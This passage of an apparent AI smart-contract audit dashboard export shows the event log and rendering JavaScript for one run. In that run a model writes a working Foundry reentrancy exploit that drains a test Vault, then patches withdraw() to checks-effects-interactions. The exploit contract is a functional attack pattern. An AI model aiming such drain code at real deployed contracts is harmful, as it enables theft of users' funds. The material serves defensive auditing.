"completion_tokens": 33, "latency_s": 0.648}, {"seq": 30, "ts": 1793264561.415266, "type": "stage_finished", "stage": "research", "finding_id": "F1", "ok": true, "duration_s": 9.29, "detail": "", "citations": [{"title": "SC08:2026 Reentrancy Attacks - OWASP Smart Contract Security", "url": "https://scs.owasp.org/sctop10/SC08-ReentrancyAttacks", "snippet": "GMX V1 contracts were exploited via a classic yet sophisticated reentrancy vector in `executeDecreaseOrder`. The function accepted the attacker's smart contract address as a parameter; when it transferred control to that address during the refund process, the attacker re-entered and manipulated global average short prices, AUM, and GLP valuations. State updates after external calls and lack of ree"}, {"title": "Reentrancy Attack: Risks, Impact, And Prevention In Smart Contracts - Hacken", "url": "https://hacken.io/discover/reentrancy-attacks", "snippet": "A reentrancy attack is a type of vulnerability exploit where an attacker leverages an unsynchronized state during an external contract call. This allows for repeated execution of actions intended to occur only once, potentially resulting in unauthorized state alterations and actions, such as excessive fund withdrawals. [...] Here we see that withdraw function has a reentrancy vulnerability. Howeve"}, {"title": "How Hackers Drain Smart Contracts: The Reentrancy Attack That Stole $60M | by Ancilar | Blockchain Services | Medium", "url": "https://medium.com/@ancilartech/how-hackers-drain-smart-contracts-the-reentrancy-attack-that-stole-60m-360ae43e88d1", "snippet": "When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract\u2019s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.\n\n## How Does Reentrancy Attack Work?\n\nA reentrancy attack involves two smart contracts. A vulnerable contract and an untrusted attacker\u2019s contra"}, {"title": "Understanding Re-entrancy in Smart Contracts \u2013 SolidityScan Blogs", "url": "https://blog.solidityscan.com/understanding-re-entrancy-in-smart-contracts-97cb67ecbb07", "snippet": "The reentrancy technique may prove a huge vulnerability for your Solidity smart contracts. It transfers the control flow to an untrusted contract that intends to drain funds. Let us explore it in detail. [...] #### Example 1\n\n```\nfunction withdraw() external {  \n uint256 amount = balances[msg.sender];  \n require(msg.sender.call.value(amount)());  \n balances[msg.sender] = 0;  \n}\n```\n\nThe attacker e"}]}, {"seq": 31, "ts": 1793264561.4460082, "type": "stage_started", "stage": "exploit", "finding_id": "F1"}, {"seq": 32, "ts": 1793264682.4069424, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "test/Exploit_F1.t.sol (2678B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 59.998, "provider": ""}, {"seq": 33, "ts": 1793264682.4285703, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 3.804, "provider": ""}, {"seq": 34, "ts": 1793264696.566621, "type": "poc_result", "finding_id": "F1", "attempt": 1, "passed": true, "confirmed": true, "test_file": "test/Exploit_F1.t.sol", "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract ReentrancyAttacker {\n    address public immutable vault;\n    uint256 public immutable amount;\n\n    constructor(address _vault, uint256 _amount) {\n        vault = _vault;\n        amount = _amount;\n    }\n\n    function deposit() external payable {\n        Vault(vault).deposit{value: msg.value}();\n    }\n\n    receive() external payable {\n        // Re-enter withdraw while the vault still holds ETH. The vault does\n        // not decrement balances[msg.sender] until after the external call,\n        // so the balance check keeps passing.\n        if (address(vault).balance >= amount) {\n            Vault(vault).withdraw(amount);\n        }\n    }\n\n    function attack() external payable {\n        Vault(vault).withdraw(amount);\n    }\n\n    function sweep() external {\n        (bool ok,) = payable(msg.sender).call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n}\n\ncontract VaultTest is Test {\n    Vault public vault;\n    address public immutable attacker = address(0x1234);\n    address public immutable victim = address(0x5678);\n\n    function setUp() public {\n        vault = new Vault();\n    }\n\n    function test_exploit() public {\n        uint256 victimDeposit = 20 ether;\n        uint256 attackerDeposit = 1 ether;\n        uint256 amount = 1 ether;\n\n        // Fund the parties so they can deposit real ETH.\n        vm.deal(victim, victimDeposit);\n        vm.deal(attacker, attackerDeposit);\n\n        // Victim deposits into the vault.\n        vm.prank(victim);\n        vault.deposit{value: victimDeposit}();\n\n        // Deploy the attacker contract and fund it.\n        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vault), amount);\n        vm.deal(address(attackerContract), attackerDeposit);\n\n        // Attacker contract deposits into the vault so balances[attackerContract] > 0.\n        vm.prank(address(attackerContract));\n        attackerContract.deposit{value: attackerDeposit}();\n\n        uint256 initialVaultAssets = vault.totalAssets();\n        assertEq(initialVaultAssets, victimDeposit + attackerDeposit);\n\n        // Initiate the reentrancy exploit.\n        vm.prank(address(attackerContract));\n        attackerContract.attack();\n\n        // The vault should be fully drained.\n        assertEq(vault.totalAssets(), 0);\n\n        // Attacker sweeps the drained funds to themselves.\n        vm.prank(attacker);\n        attackerContract.sweep();\n\n        // Concrete harm: attacker ends with far more than the 1 ETH they deposited.\n        assertGt(attacker.balance, attackerDeposit);\n    }\n}", "output": "[PASS] VaultTest.test_exploit()", "note": ""}, {"seq": 35, "ts": 1793264696.611619, "type": "llm_call", "role": "exploit", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 758, "completion_tokens": 13023, "latency_s": 119.913}, {"seq": 36, "ts": 1793264696.6151223, "type": "stage_finished", "stage": "exploit", "finding_id": "F1", "ok": true, "duration_s": 135.169, "detail": "confirmed after 1 attempt(s)", "citations": []}, {"seq": 37, "ts": 1793264696.695978, "type": "stage_started", "stage": "patch", "finding_id": "F1"}, {"seq": 38, "ts": 1793264696.7400322, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 23.127, "provider": ""}, {"seq": 39, "ts": 1793264712.1054802, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "src/Vault.sol (651B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 37.176, "provider": ""}, {"seq": 40, "ts": 1793264712.1242266, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "src/Vault.sol (651B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 0.21, "provider": ""}, {"seq": 41, "ts": 1793264712.1388922, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 10.51, "provider": ""}, {"seq": 42, "ts": 1793264728.899241, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --no-match-path test/Exploit_F1.t.sol", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 31.666, "provider": ""}, {"seq": 43, "ts": 1793264737.7278845, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 25.986, "provider": ""}, {"seq": 44, "ts": 1793264737.7594106, "type": "llm_call", "role": "patch", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 1270, "completion_tokens": 1010, "latency_s": 7.727}, {"seq": 45, "ts": 1793264737.7604904, "type": "llm_call", "role": "patch", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 1573, "completion_tokens": 1087, "latency_s": 7.523}, {"seq": 46, "ts": 1793264737.7656965, "type": "stage_finished", "stage": "patch", "finding_id": "F1", "ok": true, "duration_s": 41.068, "detail": "Reordered withdraw() to follow checks-effects-interactions: the user's balance is decremented before the external call, so a re-entrant withdraw() will fail the balance check and revert instead of draining the vault.", "citations": []}, {"seq": 47, "ts": 1793264737.7682652, "type": "patch_result", "finding_id": "F1", "applied": true, "attempts": 1, "poc_blocked": true, "suite_green": true, "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}", "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"30ms 398\u00b5s 790ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"5ms 382\u00b5s 674ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112679}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"1ms 571\u00b5s 232ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n", "note": "Reordered withdraw() to follow checks-effects-interactions: the user's balance is decremented before the external call, so a re-entrant withdraw() will fail the balance check and revert instead of draining the vault."}, {"seq": 48, "ts": 1793264737.8424463, "type": "run_finished", "ok": true, "duration_s": 462.883, "error": ""}]};</script><script>(function(){
+// Tiny Solidity / diff highlighter. Everything is HTML-escaped first; spans are added after.
+function esc(s) {
+  return String(s ?? "").replace(/[&<>"']/g, (c) =>
+    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
+}
+
+const KW = new Set(("pragma import contract interface library function modifier constructor event error " +
+  "struct enum mapping public private internal external view pure payable returns return if else for " +
+  "while do require revert emit new is memory storage calldata immutable constant override virtual " +
+  "unchecked receive fallback using assembly try catch").split(" "));
+const TY = new Set(("uint uint8 uint128 uint256 int int256 address bool bytes bytes32 string").split(" "));
+
+function solidity(code) {
+  const re = /(\/\/[^\n]*|\/\*[\s\S]*?\*\/)|("(?:[^"\\\n]|\\.)*")|(\b0x[0-9a-fA-F]+\b|\b\d[\d_]*(?:e\d+)?\b)|([A-Za-z_]\w*)/g;
+  let out = "", last = 0, m;
+  while ((m = re.exec(code))) {
+    out += esc(code.slice(last, m.index));
+    last = re.lastIndex;
+    if (m[1]) out += `<span class="tk-c">${esc(m[1])}</span>`;
+    else if (m[2]) out += `<span class="tk-s">${esc(m[2])}</span>`;
+    else if (m[3]) out += `<span class="tk-n">${esc(m[3])}</span>`;
+    else if (KW.has(m[4])) out += `<span class="tk-k">${esc(m[4])}</span>`;
+    else if (TY.has(m[4]) || /^[A-Z]\w*$/.test(m[4])) out += `<span class="tk-t">${esc(m[4])}</span>`;
+    else out += esc(m[4]);
+  }
+  return out + esc(code.slice(last));
+}
+
+function diff(text) {
+  return String(text ?? "").split("\n").map((l) => {
+    const cls = l.startsWith("+++") || l.startsWith("---") ? "df-h" :
+      l.startsWith("+") ? "df-a" : l.startsWith("-") ? "df-d" : l.startsWith("@@") ? "df-h" : "";
+    return `<span class="${cls}">${esc(l)}</span>`;
+  }).join("\n");
+}
+
+// Pure reducer: events -> view state. The same code runs live (SSE), on replay and in the export.
+const STAGES = ["baseline", "scan", "recon", "research", "exploit", "patch"];
+
+function emptyState() {
+  return {
+    run: null, finished: null, t0: null, tNow: null,
+    stages: Object.fromEntries(STAGES.map((s) => [s, { status: "pending", runs: [] }])),
+    findings: {}, order: [], fw: [], quarantines: [], llm: [],
+  };
+}
+
+function finding(st, id) {
+  if (!st.findings[id]) {
+    st.findings[id] = { finding: null, attempts: [], patch: null, citations: [], stage: {} };
+    st.order.push(id);
+  }
+  return st.findings[id];
+}
+
+function reduce(st, e) {
+  st.tNow = e.ts;
+  if (st.t0 === null) st.t0 = e.ts;
+  switch (e.type) {
+    case "run_started": st.run = e; break;
+    case "stage_started": {
+      const s = st.stages[e.stage];
+      s.runs.push({ id: e.finding_id, status: "running" });
+      if (e.finding_id) finding(st, e.finding_id).stage[e.stage] = "running";
+      s.status = "running";
+      break;
+    }
+    case "stage_finished": {
+      const s = st.stages[e.stage];
+      const r = [...s.runs].reverse().find((x) => x.id === e.finding_id && x.status === "running");
+      if (r) Object.assign(r, { status: e.ok ? "ok" : "fail", detail: e.detail, duration_s: e.duration_s });
+      s.status = s.runs.some((x) => x.status === "running") ? "running"
+        : s.runs.every((x) => x.status === "ok") ? "ok" : "fail";
+      if (e.finding_id) {
+        const f = finding(st, e.finding_id);
+        f.stage[e.stage] = e.ok ? "ok" : "fail";
+        if (e.citations?.length) f.citations = e.citations;
+      }
+      break;
+    }
+    case "finding_added": finding(st, e.finding.id).finding = e.finding; break;
+    case "poc_result": finding(st, e.finding_id).attempts.push(e); break;
+    case "patch_result": finding(st, e.finding_id).patch = e; break;
+    case "firewall_decision": st.fw.push(e); break;
+    case "input_quarantined": st.quarantines.push(e); break;
+    case "llm_call": st.llm.push(e); break;
+    case "run_finished": st.finished = e; break;
+  }
+  return st;
+}
+
+function fromEvents(events) {
+  const st = emptyState();
+  for (const e of events) reduce(st, e);
+  return st;
+}
+
+function totals(st) {
+  const tok = st.llm.reduce((a, c) => a + c.prompt_tokens + c.completion_tokens, 0);
+  const providers = [...new Set(st.llm.map((c) => c.provider).concat(st.run ? [st.run.provider] : []))];
+  const confirmed = st.order.filter((id) => st.findings[id].attempts.some((a) => a.confirmed)).length;
+  const fixed = st.order.filter((id) => st.findings[id].patch?.applied).length;
+  const dur = st.finished ? st.finished.duration_s : (st.tNow && st.t0 ? st.tNow - st.t0 : 0);
+  return {
+    findings: st.order.filter((id) => st.findings[id].finding).length, confirmed, fixed,
+    tokens: tok, calls: st.llm.length, providers, duration_s: dur,
+    denies: st.fw.filter((f) => f.verdict === "deny").length, allows: st.fw.filter((f) => f.verdict === "allow").length,
+    quarantined: st.quarantines.length,
+  };
+}
+
+function latencyByLayer(st) {
+  const by = {};
+  for (const f of st.fw) (by[f.layer] ||= []).push(f.latency_ms);
+  return Object.entries(by).map(([layer, a]) => {
+    a.sort((x, y) => x - y);
+    const sum = a.reduce((x, y) => x + y, 0);
+    return { layer, n: a.length, mean: sum / a.length, p50: a[Math.floor(a.length / 2)], max: a[a.length - 1] };
+  }).sort((x, y) => x.layer.localeCompare(y.layer));
+}
+
+
+
+const fmtDur = (s) => (s >= 60 ? `${Math.floor(s / 60)}m ${Math.round(s % 60)}s` : `${s.toFixed(1)}s`);
+const fmtMs = (ms) => (ms >= 100 ? `${ms.toFixed(0)}ms` : `${ms.toFixed(2)}ms`);
+const SEV = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
+
+function banner(st) {
+  if (!st.run?.scripted) return "";
+  return `<div class="banner"><b>SAMPLE &mdash; scripted model.</b> Model text in this run was replayed
+    from a script, not produced by an LLM. Forge execution, the scanner and the firewall are real.
+    Token counts are 0 because no model was called.</div>`;
+}
+
+function header(st) {
+  const t = totals(st), r = st.run;
+  if (!r) return `<div class="hdr"><div class="muted">waiting for run&hellip;</div></div>`;
+  const state = st.finished ? (st.finished.ok ? "finished" : "failed") : "running";
+  const cell = (k, v, cls = "") => `<div class="stat ${cls}"><div class="k">${k}</div><div class="v">${v}</div></div>`;
+  return `<div class="hdr">
+    <div class="hdr-top"><h1>${esc(r.repo)}</h1><span class="pill ${state}">${state}</span></div>
+    <div class="stats">
+      ${cell("findings", t.findings)}
+      ${cell("confirmed", t.confirmed, t.confirmed ? "red" : "")}
+      ${cell("patched", t.fixed, t.fixed ? "green" : "")}
+      ${cell("fw denied", t.denies, t.denies ? "red" : "")}
+      ${cell("quarantined", t.quarantined, t.quarantined ? "red" : "")}
+      ${cell("duration", fmtDur(t.duration_s))}
+      ${cell("tokens", t.tokens.toLocaleString() + (t.calls ? ` <small>(${t.calls} calls)</small>` : ""))}
+      ${cell("cost", "n/a <small>no pricing configured</small>")}
+      ${cell("providers", esc(t.providers.join(", ") || "-"))}
+    </div></div>`;
+}
+
+const STAGE_LABEL = { baseline: "Baseline", scan: "Scan", recon: "Recon", research: "Research", exploit: "Exploit", patch: "Patch" };
+function stepper(st) {
+  return `<div class="stepper">${STAGES.map((s, i) => {
+    const x = st.stages[s];
+    const n = x.runs.length, ok = x.runs.filter((r) => r.status === "ok").length;
+    const meta = x.status === "pending" ? (st.finished ? "not run" : "pending") : n > 1 || ["research", "exploit", "patch"].includes(s) ? `${ok}/${n}` : x.status;
+    return `<div class="step ${x.status}"><div class="dot">${x.status === "ok" ? "&#10003;" : x.status === "fail" ? "&#10005;" : i + 1}</div>
+      <div class="lbl">${STAGE_LABEL[s]}<small>${meta}</small></div></div>`;
+  }).join("")}</div>`;
+}
+
+function sevChip(s) { return `<span class="sev sev-${esc(s)}">${esc(s)}</span>`; }
+
+function findingStatus(f) {
+  if (f.attempts.some((a) => a.confirmed)) return ["confirmed", "CONFIRMED", "red"];
+  if (f.attempts.length && f.stage.exploit && f.stage.exploit !== "running") return ["unconfirmed", "UNCONFIRMED", "grey"];
+  if (f.stage.exploit === "running") return ["testing", "TESTING PoC", "amber"];
+  return ["suspected", "SUSPECTED", "grey"];
+}
+
+function findingCards(st) {
+  const ids = st.order.filter((id) => st.findings[id].finding)
+    .sort((a, b) => SEV[st.findings[a].finding.severity] - SEV[st.findings[b].finding.severity]);
+  if (!ids.length) return `<div class="empty">No findings yet.</div>`;
+  return ids.map((id) => {
+    const f = st.findings[id], fd = f.finding, [, label, col] = findingStatus(f);
+    const step = (name, key) => {
+      const v = f.stage[key];
+      return `<span class="mini ${v || "pending"}">${name}</span>`;
+    };
+    const patch = f.patch ? (f.patch.applied ? `<span class="mini ok">patched</span>` : `<span class="mini fail">patch failed</span>`) : "";
+    return `<div class="card finding ${col}"><div class="row">${sevChip(fd.severity)}<b>${esc(fd.title)}</b>
+      <span class="chip ${col}">${label}</span></div>
+      <div class="muted mono">${esc(fd.file)}${fd.function ? " :: " + esc(fd.function) : ""}</div>
+      <p>${esc(fd.description)}</p>
+      <div class="minis">${step("research", "research")}${step("exploit", "exploit")}${patch || step("patch", "patch")}
+      <span class="muted">${f.attempts.length ? f.attempts.length + " PoC attempt(s)" : ""}</span></div></div>`;
+  }).join("");
+}
+
+function fwFeed(st, limit = 200) {
+  if (!st.fw.length) return `<div class="empty">No firewall activity yet.</div>`;
+  const t0 = st.t0;
+  return `<div class="feed">${[...st.fw].reverse().slice(0, limit).map((f) => `
+    <div class="fw ${f.verdict}"><span class="vd">${f.verdict === "deny" ? "DENY" : "ALLOW"}</span>
+    <span class="chip lay">${esc(f.layer)}</span><span class="mono act">${esc(f.kind)} ${esc(f.action)}</span>
+    <span class="why">${esc(f.rule)} &mdash; ${esc(f.reason)}</span>
+    <span class="meta">${fmtMs(f.latency_ms)}${f.provider ? " &middot; " + esc(f.provider) : ""} &middot; +${(f.ts - t0).toFixed(1)}s</span></div>`).join("")}</div>`;
+}
+
+function live(st) {
+  return `${stepper(st)}<div class="cols"><section><h2>Findings</h2>${findingCards(st)}</section>
+    <section><h2>Firewall <small>${st.fw.length} decisions</small></h2>${fwFeed(st)}</section></div>`;
+}
+
+// ---------------- report ----------------
+function code(html) { return `<pre class="code">${html}</pre>`; }
+
+function reportFinding(st, id, rep) {
+  const f = st.findings[id], fd = f.finding;
+  const [, label, col] = findingStatus(f);
+  const last = f.attempts[f.attempts.length - 1];
+  const attempts = f.attempts.map((a) => `<details ${a === last ? "open" : ""}><summary>
+      <span class="chip ${a.passed ? "red" : "grey"}">attempt ${a.attempt}: ${a.passed ? "exploit works" : a.note?.startsWith("blocked") ? "blocked by firewall" : "did not work"}</span></summary>
+      ${a.note && !a.passed ? `<div class="muted small">${esc(a.note)}</div>` : ""}
+      ${a.output ? code(esc(a.output)) : ""}</details>`).join("");
+  const p = f.patch;
+  const ba = `<div class="ba">
+    <div class="ba-box red"><div class="k">before patch</div><div class="v">${f.attempts.some((a) => a.confirmed) ? "exploit PASSES &rarr; bug confirmed" : "exploit not demonstrated"}</div></div>
+    <div class="arrow">&rarr;</div>
+    <div class="ba-box ${p?.applied ? "green" : "grey"}"><div class="k">after patch</div><div class="v">${p ? (p.applied ? "exploit FAILS &middot; existing suite green" : "patch not accepted") : "no patch attempted"}</div></div></div>`;
+  const cites = f.citations.length ? `<h4>Sources (Tavily)</h4><ul class="cites">${f.citations.map((c) =>
+    `<li><a href="${esc(c.url)}" target="_blank" rel="noopener noreferrer">${esc(c.title || c.url)}</a><div class="muted small">${esc(c.snippet)}</div></li>`).join("")}</ul>` : "";
+  return `<article class="card finding ${col}"><div class="row">${sevChip(fd.severity)}<b>${esc(fd.title)}</b><span class="chip ${col}">${label}</span></div>
+    <div class="muted mono">${esc(fd.file)}${fd.function ? " :: " + esc(fd.function) : ""}</div>
+    <p>${esc(fd.description)}</p><h4>Attack</h4><p>${esc(fd.attack)}</p>
+    ${ba}
+    <h4>Proof of concept <small>${f.attempts.length} attempt(s)</small></h4>${attempts || '<div class="empty">none</div>'}
+    ${last?.code ? `<details open><summary>PoC code (${esc(last.test_file)})</summary>${code(solidity(last.code))}</details>` : ""}
+    ${p?.diff ? `<h4>Patch <small>${p.attempts} attempt(s)</small></h4>${p.note ? `<p class="muted">${esc(p.note)}</p>` : ""}${code(diff(p.diff))}` : ""}
+    ${cites}</article>`;
+}
+
+function report(st, rep) {
+  const ids = st.order.filter((id) => st.findings[id].finding)
+    .sort((a, b) => SEV[st.findings[a].finding.severity] - SEV[st.findings[b].finding.severity]);
+  const llm = {};
+  for (const c of st.llm) { const k = `${c.provider} / ${c.model}`; (llm[k] ||= { n: 0, p: 0, c: 0, s: 0 }); llm[k].n++; llm[k].p += c.prompt_tokens; llm[k].c += c.completion_tokens; llm[k].s += c.latency_s; }
+  const rows = Object.entries(llm).map(([k, v]) => `<tr><td class="mono">${esc(k)}</td><td>${v.n}</td><td>${v.p.toLocaleString()}</td><td>${v.c.toLocaleString()}</td><td>${v.s.toFixed(2)}s</td></tr>`).join("");
+  return `${ids.length ? ids.map((id) => reportFinding(st, id, rep)).join("") : '<div class="empty">No findings.</div>'}
+    <h2>Model calls</h2><div class="tablewrap"><table><tr><th>provider / model</th><th>calls</th><th>prompt tok</th><th>completion tok</th><th>time</th></tr>${rows || '<tr><td colspan="5" class="muted">none</td></tr>'}</table></div>`;
+}
+
+// ---------------- firewall ----------------
+function quarantineFile(file, text, spans) {
+  const lines = text.split("\n");
+  const inSpan = (n) => spans.some((s) => n >= s.start_line && n <= s.end_line);
+  return `<div class="qfile"><div class="qname mono">${esc(file)} <span class="chip red">${spans.length} span(s) quarantined</span></div>
+    <pre class="code qsrc">${lines.map((l, i) => `<span class="ln">${i + 1}</span><span class="${inSpan(i + 1) ? "qhit" : ""}">${esc(l)}</span>`).join("\n")}</pre>
+    ${spans.map((s) => `<div class="muted small">lines ${s.start_line}-${s.end_line}: ${esc(s.detector)} detector &mdash; ${esc(s.reason)}. The agent saw a <code>[REDACTED]</code> placeholder instead.</div>`).join("")}</div>`;
+}
+
+function firewall(st, rep) {
+  const byFile = {};
+  for (const q of st.quarantines) (byFile[q.file] ||= []).push(q);
+  const files = Object.entries(byFile).map(([f, spans]) => {
+    const text = rep?.quarantine_files?.[f];
+    return text ? quarantineFile(f, text, spans) :
+      `<div class="qfile"><div class="qname mono">${esc(f)}</div>${spans.map((s) => `<pre class="code"><span class="qhit">${esc(s.excerpt)}</span></pre><div class="muted small">lines ${s.start_line}-${s.end_line}: ${esc(s.detector)} &mdash; ${esc(s.reason)}</div>`).join("")}</div>`;
+  }).join("");
+  const denied = st.fw.filter((f) => f.verdict === "deny");
+  const lat = latencyByLayer(st);
+  const maxMean = Math.max(...lat.map((l) => l.mean), 0.001);
+  const LNAME = { L1: "L1 deterministic rules", L2: "L2 Nemotron policy", scanner: "scanner" };
+  return `<h2>Quarantined input <small>${st.quarantines.length} span(s)</small></h2>${files || '<div class="empty">Nothing quarantined.</div>'}
+    <h2>Blocked actions <small>${denied.length}</small></h2>
+    ${denied.length ? `<div class="feed">${denied.map((f) => `<div class="fw deny"><span class="vd">DENY</span><span class="chip lay">${esc(f.layer)}</span>
+      <span class="mono act">${esc(f.kind)} ${esc(f.action)}</span><span class="why">${esc(f.rule)} &mdash; ${esc(f.reason)}</span>
+      <span class="meta">${fmtMs(f.latency_ms)}</span></div>`).join("")}</div>` : '<div class="empty">No actions were blocked in this run.</div>'}
+    <h2>Latency by layer</h2><div class="tablewrap"><table><tr><th>layer</th><th>decisions</th><th>mean</th><th>p50</th><th>max</th><th></th></tr>
+    ${lat.map((l) => `<tr><td>${esc(LNAME[l.layer] || l.layer)}</td><td>${l.n}</td><td>${fmtMs(l.mean)}</td><td>${fmtMs(l.p50)}</td><td>${fmtMs(l.max)}</td>
+      <td class="barcell"><div class="bar" style="width:${Math.max(2, (l.mean / maxMean) * 100)}%"></div></td></tr>`).join("") || '<tr><td colspan="6" class="muted">no decisions</td></tr>'}</table></div>`;
+}
+
+
+
+const $ = (s) => document.querySelector(s);
+const EXPORT = window.__REDLINE_DATA__ || null;
+let st = emptyState(), rep = null, view = "live", es = null, runs = [], runId = null, timer = null;
+
+function shell() {
+  $("#app").innerHTML = `<header class="top"><div class="brand"><span class="logo">&#9632;</span> REDLINE</div>
+    <div class="ctl">${EXPORT ? "" : `<select id="runsel"></select>`}<button id="replay" title="Replay this run">&#9654; Replay</button></div></header>
+    ${EXPORT ? "" : `<form id="auditform" class="auditform"><input id="auditurl" type="url" required placeholder="https://github.com/owner/foundry-repo" autocomplete="off"><button id="auditbtn">Audit repo</button></form><div id="auditmsg" class="auditmsg"></div>`}
+    <nav class="tabs"><button data-v="live">Live</button><button data-v="report">Report</button><button data-v="firewall">Firewall</button></nav>
+    <main><div id="banner"></div><div id="hdr"></div><div id="view"></div></main>`;
+  document.querySelectorAll(".tabs button").forEach((b) => b.onclick = () => { view = b.dataset.v; history.replaceState(null, "", `#${runId || ""}/${view}`); paint(); });
+  $("#replay").onclick = () => start(true);
+  if (!EXPORT) $("#auditform").onsubmit = submitAudit;
+  if (!EXPORT) $("#runsel").onchange = (e) => { runId = e.target.value; history.replaceState(null, "", `#${runId}/${view}`); start(true); };
+}
+
+let raf = 0;
+function schedule() { if (!raf) raf = requestAnimationFrame(() => { raf = 0; paint(); }); }
+function paint() {
+  document.querySelectorAll(".tabs button").forEach((b) => b.classList.toggle("on", b.dataset.v === view));
+  $("#banner").innerHTML = banner(st);
+  $("#hdr").innerHTML = header(st);
+  const v = $("#view"), y = window.scrollY;
+  v.innerHTML = view === "live" ? live(st) : view === "report" ? report(st, rep) : firewall(st, rep);
+  window.scrollTo(0, y);
+}
+
+function clamp(d) { return Math.min(Math.max(d, 0.15), 2.5); }
+
+function replayLocal(events) {
+  st = emptyState();
+  let i = 0, prev = null;
+  const next = () => {
+    if (i >= events.length) return;
+    const e = events[i++];
+    const wait = prev === null ? 0 : clamp(e.ts - prev) * 1000;
+    prev = e.ts;
+    timer = setTimeout(() => { reduce(st, e); schedule(); next(); }, wait);
+  };
+  next();
+}
+
+async function start(replay) {
+  if (es) { es.close(); es = null; }
+  clearTimeout(timer);
+  st = emptyState(); rep = null; paint();
+  if (EXPORT) { rep = EXPORT.report; replay ? replayLocal(EXPORT.events) : (st = fromEvents(EXPORT.events), paint()); return; }
+  if (!runId) return;
+  const data = await (await fetch(`/runs/${encodeURIComponent(runId)}`)).json();
+  rep = data.report;
+  es = new EventSource(`/runs/${encodeURIComponent(runId)}/stream`);
+  const types = ["run_started", "stage_started", "stage_finished", "finding_added", "poc_result", "patch_result", "firewall_decision", "input_quarantined", "llm_call", "run_finished"];
+  for (const t of types) es.addEventListener(t, (m) => { reduce(st, JSON.parse(m.data)); schedule(); });
+  es.addEventListener("end", () => { es.close(); fetch(`/runs/${encodeURIComponent(runId)}`).then((r) => r.json()).then((d) => { rep = d.report; schedule(); }); });
+}
+
+async function submitAudit(e) {
+  e.preventDefault();
+  const btn = $("#auditbtn"), msg = $("#auditmsg");
+  btn.disabled = true; msg.className = "auditmsg"; msg.textContent = "Cloning repository...";
+  try {
+    const r = await fetch("/audit", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: $("#auditurl").value }) });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.detail || "request failed");
+    msg.textContent = "Audit started.";
+    for (let i = 0; i < 40; i++) {
+      if ((await fetch(`/runs/${d.run_id}`)).ok) break;
+      await new Promise((ok) => setTimeout(ok, 500));
+    }
+    runs = await (await fetch("/runs")).json();
+    $("#runsel").innerHTML = runs.map((x) => `<option value="${x.id}">${x.id}${x.scripted ? " (SAMPLE)" : ""} - ${x.status}</option>`).join("");
+    runId = d.run_id; $("#runsel").value = runId; view = "live";
+    history.replaceState(null, "", `#${runId}/live`);
+    start(false);
+  } catch (err) { msg.className = "auditmsg err"; msg.textContent = String(err.message || err); }
+  btn.disabled = false;
+}
+
+async function boot() {
+  shell();
+  const [h, v] = location.hash.slice(1).split("/");
